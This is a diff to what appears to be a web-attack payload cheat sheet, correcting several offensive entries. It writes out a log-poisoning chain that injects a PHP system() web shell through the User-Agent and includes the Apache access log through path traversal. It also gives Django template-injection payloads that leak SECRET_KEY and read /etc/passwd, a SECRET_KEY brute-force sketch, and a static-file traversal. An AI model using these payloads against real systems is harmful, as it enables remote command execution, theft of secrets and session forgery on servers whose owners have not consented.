@@ -347,8 +347,8 @@ shell.php::$DATA
 ```bash
 # Inject PHP into User-Agent
 curl -A "<?php system(\$_GET['cmd']); ?>" http://target/page
-# Then include:
-http://target/../../../var/log/apache2/access.log&cmd=id
+# Then include via LFI (note: '?' separates path from query):
+http://target/index.php?page=../../../var/log/apache2/access.log&cmd=id
 ```
 
 ### Image-Based Payload
@@ -499,8 +499,10 @@ ${self.module.cache}
 ```django
 {{7*7}}
 {% debug %}
-{% load os %}{{os.popen('id').read()}}
+{{settings.SECRET_KEY}}
+{% include "/etc/passwd" %}
 ```
+**Note:** Django's `{% load %}` cannot import Python modules — it only loads registered template tag libraries. Use `{{settings.SECRET_KEY}}` for information disclosure or file inclusion vectors instead.
 
 ### ERB (Ruby)
 
@@ -1227,9 +1229,12 @@ http://target/console
 
 ### Django
 
-```bash
-# SECRET_KEY brute force
-flask-unsign -u -c "session_cookie_value"
+```python
+# Django session cookie: base64(JSON) + ":" + base64(HMAC-SHA256)
+# Unlike Flask, Django sessions are signed JSON, not pickle-based.
+import base64, hashlib, hmac, json
+# Brute-force SECRET_KEY from known session cookie + unsigned payload
+# Use django.core.signing.TimestampSigner with candidate keys
 
 # Path traversal via static files
 /static/../../etc/passwd
